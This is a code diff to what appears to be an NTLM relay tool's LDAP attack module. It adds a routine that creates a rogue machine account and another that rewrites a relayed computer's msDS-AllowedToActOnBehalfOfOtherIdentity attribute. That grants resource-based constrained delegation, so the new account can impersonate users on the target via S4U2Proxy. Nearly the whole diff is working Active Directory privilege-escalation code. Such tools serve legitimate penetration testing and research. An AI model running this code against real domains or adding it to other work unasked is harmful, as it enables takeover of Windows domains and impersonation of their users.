@@ -47,6 +47,8 @@ PROTOCOL_ATTACK_CLASS = "LDAPAttack"
 # and to prevent privilege escalating more than once
 dumpedDomain = False
 alreadyEscalated = False
+alreadyAddedComputer = False
+delegatePerformed = []
 class LDAPAttack(ProtocolAttack):
     """
     This is the default LDAP attack. It checks the privileges of the relayed account
@@ -66,6 +68,58 @@ class LDAPAttack(ProtocolAttack):
 
     def __init__(self, config, LDAPClient, username):
         ProtocolAttack.__init__(self, config, LDAPClient, username)
+
+    def addComputer(self, parent, domainDumper):
+        """
+        Add a new computer. Parent is preferably CN=computers,DC=Domain,DC=local, but can
+        also be an OU or other container where we have write privileges
+        """
+        global alreadyAddedComputer
+        if alreadyAddedComputer:
+            LOG.error('New computer already added. Refusing to add another')
+            return
+
+        # Random password
+        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+
+        # Get the domain we are in
+        domaindn = domainDumper.root
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+
+        # Random computername
+        newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
+        computerHostname = newComputer[:-1]
+        newComputerDn = ('CN=%s,%s' % (computerHostname, parent)).encode('utf-8')
+
+        # Default computer SPNs
+        spns = [
+            'HOST/%s' % computerHostname,
+            'HOST/%s.%s' % (computerHostname, domain),
+            'RestrictedKrbHost/%s' % computerHostname,
+            'RestrictedKrbHost/%s.%s' % (computerHostname, domain),
+        ]
+        ucd = {
+            'dnsHostName': '%s.%s' % (computerHostname, domain),
+            'userAccountControl': 4096,
+            'servicePrincipalName': spns,
+            'sAMAccountName': newComputer,
+            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
+        }
+        LOG.debug('New computer info %s', ucd)
+        LOG.info('Attempting to create computer in: %s', parent)
+        res = self.client.add(newComputerDn.decode('utf-8'), ['top','person','organizationalPerson','user','computer'], ucd)
+        if not res:
+            # Adding computers requires LDAPS
+            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
+                LOG.error('Failed to add a new computer. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing account.')
+            else:
+                LOG.error('Failed to add a new computer: %s' % str(self.client.result))
+            return False
+        else:
+            LOG.info('Adding new computer with username: %s and password: %s result: OK' % (newComputer, newPassword))
+            alreadyAddedComputer = True
+            # Return the SAM name
+            return newComputer
 
     def addUser(self, parent, domainDumper):
         """
@@ -96,8 +150,8 @@ class LDAPAttack(ProtocolAttack):
             'sAMAccountName': newUser,
             'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
         }
-        LOG.info('Attempting to create user in: %s' % parent)
-        res = self.client.add(newUserDn, ['top','person','organizationalPerson','user'], ucd)
+        LOG.info('Attempting to create user in: %s', parent)
+        res = self.client.add(newUserDn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
         if not res:
             # Adding users requires LDAPS
             if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
@@ -126,6 +180,62 @@ class LDAPAttack(ProtocolAttack):
             thread.interrupt_main()
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
+
+    def delegateAttack(self, usersam, targetsam, domainDumper):
+        global delegatePerformed
+        if targetsam in delegatePerformed:
+            LOG.info('Delegate attack already performed for this computer, skipping')
+            return
+
+        if not usersam:
+            usersam = self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)
+            self.config.escalateuser = usersam
+
+        # Get escalate user sid
+        result = self.getUserInfo(domainDumper, usersam)
+        if not result:
+            LOG.error('User to escalate does not exist!')
+            return
+        escalate_sid = str(result[1])
+
+        # Get target computer DN
+        result = self.getUserInfo(domainDumper, targetsam)
+        if not result:
+            LOG.error('Computer to modify does not exist! (wrong domain?)')
+            return
+        target_dn = result[0]
+
+        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+        targetuser = None
+        for entry in self.client.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            targetuser = entry
+        if not targetuser:
+            LOG.error('Could not query target user properties')
+            return
+        try:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
+            LOG.debug('Currently allowed sids:')
+            for ace in sd['Dacl'].aces:
+                LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
+        except IndexError:
+            # Create DACL manually
+            sd = create_empty_sd()
+        sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
+        self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
+        if self.client.result['result'] == 0:
+            LOG.info('Delegation rights modified succesfully!')
+            LOG.info('%s can now impersonate users on %s via S4U2Proxy', usersam, targetsam)
+            delegatePerformed.append(targetsam)
+        else:
+            if self.client.result['result'] == 50:
+                LOG.error('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
+            elif self.client.result['result'] == 19:
+                LOG.error('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            else:
+                LOG.error('The server returned an error: %s', self.client.result['message'])
+        return
 
     def aclAttack(self, userDn, domainDumper):
         global alreadyEscalated
@@ -449,7 +559,18 @@ class LDAPAttack(ProtocolAttack):
                 return
             else:
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
-                    'privileges. Specify a user to assign privileges to with --escalate-user')
+                          'privileges. Specify a user to assign privileges to with --escalate-user')
+
+        # Perform the Delegate attack if it is enabled and we relayed a computer account
+        if self.config.delegateaccess and self.username[-1] == '$':
+            self.delegateAttack(self.config.escalateuser, self.username, domainDumper)
+            return
+
+        # Add a new computer if that is requested
+        # privileges required are not yet enumerated, neither is ms-ds-MachineAccountQuota
+        if self.config.addcomputer:
+            self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)
+            return
 
         # Last attack, dump the domain if no special privileges are present
         if not dumpedDomain and self.config.dumpdomain:
@@ -474,6 +595,37 @@ def create_object_ace(privguid, sid):
     acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
     nace['Ace'] = acedata
     return nace
+
+# Create an ALLOW ACE with the specified sid
+def create_allow_ace(sid):
+    nace = ldaptypes.ACE()
+    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    nace['AceFlags'] = 0x00
+    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+    acedata['Mask'] = ldaptypes.ACCESS_MASK()
+    acedata['Mask']['Mask'] = 983551 # Full control
+    acedata['Sid'] = ldaptypes.LDAP_SID()
+    acedata['Sid'].fromCanonical(sid)
+    nace['Ace'] = acedata
+    return nace
+
+def create_empty_sd():
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    sd['Revision'] = b'\x01'
+    sd['Sbz1'] = b'\x00'
+    sd['Control'] = 32772
+    sd['OwnerSid'] = ldaptypes.LDAP_SID()
+    # BUILTIN\Administrators
+    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
+    sd['GroupSid'] = b''
+    sd['Sacl'] = b''
+    acl = ldaptypes.ACL()
+    acl['AclRevision'] = 4
+    acl['Sbz1'] = 0
+    acl['Sbz2'] = 0
+    acl.aces = []
+    sd['Dacl'] = acl
+    return sd
 
 # Check if an ACE allows for creation of users
 def can_create_users(ace):
